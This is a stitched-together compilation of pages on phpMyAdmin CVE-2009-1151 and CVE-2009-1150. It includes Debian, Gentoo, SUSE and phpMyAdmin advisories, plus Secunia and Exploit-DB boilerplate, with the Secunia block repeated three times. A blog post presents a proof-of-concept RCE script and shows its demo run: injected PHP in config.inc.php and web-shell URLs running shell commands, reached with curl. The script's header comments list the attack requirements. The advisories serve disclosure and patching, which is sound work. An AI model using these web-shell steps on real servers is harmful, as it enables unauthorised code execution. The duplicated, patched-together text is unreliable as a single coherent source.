Debian Security Advisory DSA-1824-1                  security@debian.org
<http://www.debian.org/security/>                          Thijs Kinkhorst
June 25, 2009                         <http://www.debian.org/security/faq>
- ------------------------------------------------------------------------

Package        : phpmyadmin
Vulnerability  : several
Problem type   : remote
Debian-specific: no
CVE Id(s)      : CVE-2009-1150 CVE-2009-1151

Several remote vulnerabilities have been discovered in phpMyAdmin, a tool
to administer MySQL over the web. The Common Vulnerabilities and Exposures
project identifies the following problems:

CVE-2009-1150

  Cross site scripting vulnerability in the export page allow for an
  attacker that can place crafted cookies with the user to inject
  arbitrary web script or HTML.

CVE-2009-1151

  Static code injection allows for a remote attacker to inject arbitrary
  code into phpMyAdmin via the setup.php script. This script is in Debian
  under normal circumstances protected via Apache authentication.
  However, because of a recent worm based on this exploit, we are patching
  it regardless, to also protect installations that somehow still expose
  the setup.php script.

For the old stable distribution (etch), these problems have been fixed in
version 2.9.1.1-11.

For the stable distribution (lenny), these problems have been fixed in
version 2.11.8.1-5+lenny1.

For the unstable distribution (sid), these problems have been fixed in
version 3.1.3.1-1.

We recommend that you upgrade your phpmyadmin package.

Upgrade instructions
- --------------------

wget url
        will fetch the file for you
dpkg -i file.deb
        will install the referenced file.

If you are using the apt-get package manager, use the line for
sources.list as given below:

apt-get update
        will update the internal database
apt-get upgrade
        will install corrected packages

You may use an automated update by adding the resources from the
footer to the proper configuration.

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

# phpMyAdmin: Multiple vulnerabilities — GLSA **200906-03**

Multiple errors in phpMyAdmin might allow the remote execution of arbitrary
code or a Cross-Site Scripting attack.

### Affected packages

| Package | **dev-db/phpmyadmin** on all architectures |
| --- | --- |
| Affected versions | < **2.11.9.5** |
| Unaffected versions | >= **2.11.9.5** |

### Background

phpMyAdmin is a web-based management tool for MySQL databases.

### Description

Multiple vulnerabilities have been reported in phpMyAdmin:

* Greg Ose discovered that the setup script does not sanitize input
  properly, leading to the injection of arbitrary PHP code into the
  configuration file (CVE-2009-1151).
* Manuel Lopez Gallego and
  Santiago Rodriguez Collazo reported that data from cookies used in the
  "Export" page is not properly sanitized (CVE-2009-1150).

### Impact

A remote unauthorized attacker could exploit the first vulnerability to
execute arbitrary code with the privileges of the user running
phpMyAdmin and conduct Cross-Site Scripting attacks using the second
vulnerability.

### Workaround

Removing the "scripts/setup.php" file protects you from CVE-2009-1151.

### Resolution

All phpMyAdmin users should upgrade to the latest version:

```
 # emerge --sync
 # emerge --ask --oneshot --verbose ">=dev-db/phpmyadmin-2.11.9.5"
```
### References

* [CVE-2009-1150](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-1150)
* [CVE-2009-1151](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-1151)

**Release date**

June 29, 2009

**Latest revision**

June 29, 2009: 01

**Severity**

high

**Exploitable**

remote

**Bugzilla entries**

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

1) Solved Security Vulnerabilities
To avoid flooding mailing lists with SUSE Security Announcements for minor
issues, SUSE Security releases weekly summary reports for the low profile
vulnerability fixes. The SUSE Security Summary Reports do not list or
download URLs like the SUSE Security Announcements that are released for
more severe vulnerabilities.
Fixed packages for the following incidents are already available on our FTP
server and via the YaST Online Update.
- multipath-tools
Default permissions on the multipathd socket file were to generous
and allowed any user to connect (CVE-2009-0115).
Affected products: SLES9, OES, NLD9
- bluez
The dbus package used a too permissive configuration. Therefore intended
access control for some services was not applied (CVE-2008-4311).
The new configuration denies access by default. Some dbus services may
break due to this setting and need an updated configuration as well.
Affected products: openSUSE 10.3
- xntp
ntp didn't properly check the return value of the openssl function
EVP\_VerifyFinal (CVE-2009-0021).
Additionally a problem where ntpd refused to use keys from /etc/ntp.keys
has been fixed.
Affected products: SLES10-SP2
- apache-mod\_php4
Specially crafted strings could trigger a heap based buffer overflow
in the php mbstring extension. Attackers could potenially exploit
that to execute arbitrary code (CVE-2008-5557).
Affected products: SLES9, OES
- apache2-mod\_php5
php 5.2.9 fixes among other things some security issues:
+ Missing bounds checks of an error in the imageRotate function of
the gd extension potentially allowed attackers to read portions of
memory (CVE-2008-5498).
+ the mbstring.func\_overload in .htaccess was applied to other virtual
hosts on th same machine (CVE-2009-0754)
Affected products: openSUSE 10.3-11.1, SLES10, SLES11
- struts
Insufficient quoting of parameters allowed attackers to conduct
cross site scripting (XSS) attacks (CVE-2008-2025).
Affected products: openSUSE 10.3-11.1, SLES10, SLES11
- qemu
qemu update to version 0.10.1 fixes the following security issues:
+ CVE-2008-0928: problems with range checks of block devices
+ CVE-2008-1945: problems with removable media handling
+ CVE-2008-2382: vnc server DoS
+ CVE-2008-4539: fix a heap overflow in the cirrus VGA implementation
+ CVE-2008-5714: off by one error in vnc password handling
Affected products: openSUSE 10.3-11.1, SLES10, SLES11
- libsndfile
Specially crafted CAF files could cause an integer overflow in
libsndfile (CVE-2009-0186).
Affected products: openSUSE 10.3-11.1, SLES10, SLES11
- phpMyAdmin
This update of phpMyAdmin fixes multiple vulnerabilities:
+ CVE-2009-1148: directory traversal
+ CVE-2009-1149: CRLF injection
+ CVE-2009-1150: cross-site scripting
+ CVE-2009-1151: static code injection
Affected products: openSUSE 10.3-11.0

3) Authenticity Verification and Additional Information
- Announcement authenticity verification:
SUSE security announcements are published via mailing lists and on Web
sites. The authenticity and integrity of a SUSE security announcement is
guaranteed by a cryptographic signature in each announcement. All SUSE
security announcements are published with a valid signature.
To verify the signature of the announcement, save it as text into a file
and run the command
gpg --verify <file>
replacing <file> with the name of the file containing the announcement.
The output for a valid signature looks like:
gpg: Signature made <DATE> using RSA key ID 3D25D3D9
gpg: Good signature from "SuSE Security Team <security@suse.de>"
where <DATE> is replaced by the date the document was signed.
If the security team's key is not contained in your key ring, you can
import it from the first installation CD. To import the key, use the
command
gpg --import gpg-pubkey-3d25d3d9-36e12d04.asc
- Package authenticity verification:
SUSE update packages are available on many mirror FTP servers all over the
world. While this service is considered valuable and important to the free
and open source software community, the authenticity and integrity of a
package needs to be verified to ensure that it has not been tampered with.
The internal RPM package signatures provide an easy way to verify the
authenticity of an RPM package. Use the command
rpm -v --checksig <file.rpm>
to verify the signature of the package, replacing <file.rpm> with the
filename of the RPM package downloaded. The package is unmodified if it
contains a valid signature from build@suse.de with the key ID 9C800ACA.
This key is automatically imported into the RPM database (on RPMv4-based
distributions) and the gpg key ring of 'root' during installation. You can
also find it on the first installation CD and included at the end of this
announcement.
- SUSE runs two security mailing lists to which any interested party may
subscribe:
opensuse-security@opensuse.org
- General Linux and SUSE security discussion.
All SUSE security announcements are sent to this list.
To subscribe, send an e-mail to
<opensuse-security+subscribe@opensuse.org>.
opensuse-security-announce@opensuse.org
- SUSE's announce-only mailing list.
Only SUSE's security announcements are sent to this list.
To subscribe, send an e-mail to
<opensuse-security-announce+subscribe@opensuse.org>.
=====================================================================
SUSE's security contact is <security@suse.com> or <security@suse.de>.
The <security@suse.de> public key is listed below.

# CVE-2009-1151 phpMyAdmin Remote Code Execution Proof of Concept

Tue, 09 Jun 2009 19:03:13 GMTby
pagvac

I couldn't find any public PoC/exploit for this [phpMyAdmin](https://www.phpmyadmin.net/home_page/index.php) vulnerability, despite it being a serious bug affecting a popular open-source project. I think this vulnerability is a nice reminder that it's still possible to perform remote command execution these days without relying on SQL injection (i.e.: `xp_cmdshell`) or a memory corruption bug (i.e.: heap overflow).

> All the documentation you need is in the script comments. I recommend you to go through it, before you actually run the script.

After reading the public [advisory](https://www.phpmyadmin.net/home_page/security/PMASA-2009-3.php) and patched code, and playing around for a while, I managed to have a working PoC bash script. The script will allow you to remotely run shell commands and PHP code against vulnerable targets. Although in principle the vulnerability sounds quite simple, it actually took me a while to go from [advisory](https://www.phpmyadmin.net/home_page/security/PMASA-2009-3.php) to working attack code.

I'm providing the script with the hope that it will help pentesters and security researchers. Please only test the script against your own systems, or systems you have been given permission to pentest! Don't be evil, it's not worth it.

## Demo

```
$ ./phpMyAdminRCE.sh
usage: ./phpMyAdminRCE.sh <phpMyAdmin_base_URL>
i.e.: ./phpMyAdminRCE.sh http://target.tld/phpMyAdmin/
```
```
$ ./phpMyAdminRCE.sh http://172.16.211.10/phpMyAdmin-3.0.1.1/
[+] checking if phpMyAdmin exists on URL provided ...
[+] phpMyAdmin cookie and form token received successfully. Good!
[+] attempting to inject phpinfo() ...
[+] success! phpinfo() injected successfully! output saved on /tmp/phpMyAdminRCE.sh.9217.phpinfo.flag.html
[+] you *should* now be able to remotely run shell commands and PHP code using your browser. i.e.:
    http://172.16.211.10/phpMyAdmin-3.0.1.1//config/config.inc.php?c=ls+-l+/
    http://172.16.211.10/phpMyAdmin-3.0.1.1//config/config.inc.php?p=phpinfo();
    please send any feedback/improvements for this script to unknown.pentester<AT_sign_goes_here>gmail.com
```
```
$ curl "http://172.16.211.10/phpMyAdmin-3.0.1.1//config/config.inc.php?c=ls+-l+/"

## Thanks

I'd like to thank [Greg Ose](http://labs.neohapsis.com/2009/04/06/about-cve-2009-1151/) for discovering such a cool vuln and doing a nice writeup about the technical details! Also big thanks to [str0ke](http://www.milw0rm.com/) for testing this PoC script and providing such useful feedback!

Kudos!![pdp](//gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=256&d=retro)pdpAlexander, all the credits go to pagvac. He is the author of this post, not me. He is also a bash ninja :)![Mike](//gravatar.com/avatar/24d90db9e7de48f500cea793b087ae12?s=256&d=retro)MikeNice Exploit.
But there are plenty of awesome remote code execution vulns. Don't Forget mysql's into\_outfile! Or Remote Code Execution with a Local File Include vulnerability! http://milw0rm.com/papers/260

Good PoC! I played with this vuln some weeks ago and I had had no time to write anything. It could be a good idea to add the vuln affecting the 3.1.3.1 version: http://www.phpmyadmin.net/home\_page/security/PMASA-2009-4.php
It's the same concept but change some files and functions (the setup page is /setup/config.php now, for example). The vulnerable package to play with: http://sourceforge.net/project/downloading.php?group\_id=23067&filename=phpMyAdmin-3.1.3.1-all-languages.tar.gz

## About

phpMyAdmin is a free software tool written in [PHP](https://php.net/),
intended to handle the administration of [MySQL](https://www.mysql.com/)
over the Web. phpMyAdmin supports a wide range of operations on MySQL and
MariaDB. Frequently used operations (managing databases, tables,
columns, relations, indexes, users, permissions, etc) can be performed via the
user interface, while you still have the ability to directly execute any SQL statement.

[![phpMyAdmin book](/static/images/books/pma_en_3.4_150x185.png)
![phpMyAdmin Starter](/static/images/books/pma_starter_150x184.jpg)](/docs/#books)

phpMyAdmin comes with a wide range of [documentation](/docs/) and users are welcome to
update [our wiki pages](https://github.com/phpmyadmin/phpmyadmin/wiki) to share ideas and
howtos for various operations. The [phpMyAdmin team](/team/) will try to help you if
you face any problem; you can use a [variety of support channels](/support/) to get
help.

phpMyAdmin is also very deeply documented in a book written by one of the developers
– [Mastering phpMyAdmin for
Effective MySQL Management](https://www.packtpub.com/big-data-and-business-intelligence/mastering-phpmyadmin-34-effective-mysql-management), which is available in English and [Spanish](/docs/#books).

To ease usage to a wide range of people, phpMyAdmin is being translated into [72 languages](/translations/) and supports both LTR
and RTL languages.

phpMyAdmin is a mature project with a stable and flexible code
base; you can find out more about the [project and its history](/about/) and the [awards](/awards/) it earned. When the project turned 15, we published a [celebration page](/15-years/).

The phpMyAdmin project is a member of [Software Freedom Conservancy](https://sfconservancy.org). SFC is a not-for-profit organization that helps promote, improve, develop, and defend Free, Libre, and Open Source Software (FLOSS) projects.

## PMASA-2009-3

**Announcement-ID:** PMASA-2009-3

**Date:** 2009-03-24

### Summary

Insufficient output sanitizing when generating configuration file.

### Description

Setup script used to generate configuration can be fooled using a crafted POST
request to include arbitrary PHP code in generated configuration file.
Combined with ability to save files on server, this can allow unauthenticated
users to execute arbitrary PHP code.

### Severity

We consider this vulnerability to be critical.

### Mitigation factor

Additional steps from administrator are required to actually exploit this
issue (web server writable config directory has to be created).

### Affected Versions

For 2.11.x: versions before 2.11.9.5.<br />
For 3.x: versions before 3.1.3.1.<br />

### Solution

Upgrade to phpMyAdmin 2.11.9.5 or 3.1.3.1 or apply patch listed below.

### References

Thanks to Greg Ose (Neohapsis), who has discovered this issue and reported it to us.

# CVE-2009-1151: phpMyAdmin '/scripts/setup.php' PHP Code Injection RCE PoC v0.11
# by pagvac (gnucitizen.org), 4th June 2009.
# special thanks to Greg Ose (labs.neohapsis.com) for discovering such a cool vuln,
# and to str0ke (milw0rm.com) for testing this PoC script and providing feedback!

# PoC script successfully tested on the following targets:
# phpMyAdmin 2.11.4, 2.11.9.3, 2.11.9.4, 3.0.0 and 3.0.1.1
# Linux 2.6.24-24-generic i686 GNU/Linux (Ubuntu 8.04.2)

# attack requirements:
# 1) vulnerable version (obviously!): 2.11.x before 2.11.9.5
# and 3.x before 3.1.3.1 according to PMASA-2009-3
# 2) it *seems* this vuln can only be exploited against environments
# where the administrator has chosen to install phpMyAdmin following
# the *wizard* method, rather than manual method: http://snipurl.com/jhjxx
# 3) administrator must have NOT deleted the '/config/' directory
# within the '/phpMyAdmin/' directory. this is because this directory is
# where '/scripts/setup.php' tries to create 'config.inc.php' which is where
# our evil PHP code is injected 8)

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.
